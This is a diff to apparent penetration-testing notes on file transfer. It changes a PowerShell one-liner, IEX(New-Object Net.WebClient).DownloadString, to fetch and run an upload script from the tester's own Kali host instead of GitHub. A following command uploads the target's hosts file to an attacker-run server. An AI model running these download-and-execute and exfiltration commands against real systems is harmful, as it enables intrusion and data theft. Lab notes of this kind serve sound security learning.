@@ -126,11 +126,14 @@ echo <base64> | base64 -d -w 0 > hosts
 
 ```powershell
 # host server on linux
-uv run --with uploadserver python -m uploadserver
+uv run --with uploadserver python -m uploadserver 8001 >/tmp/upload.log 2>&1 & \
+python3 -m http.server 8000 >/tmp/http.log 2>&1 & \
+sleep 2 && \
+wget https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1
 
 # upload from windows (internet require to install script)
-IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
-Invoke-FileUpload -Uri http://10.10.14.226:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+IEX(New-Object Net.WebClient).DownloadString('http://<kali-IP>:8000/PSUpload.ps1')
+Invoke-FileUpload -Uri http://10.10.14.226:8001/upload -File C:\Windows\System32\drivers\etc\hosts
 ```
 
 ### SMB
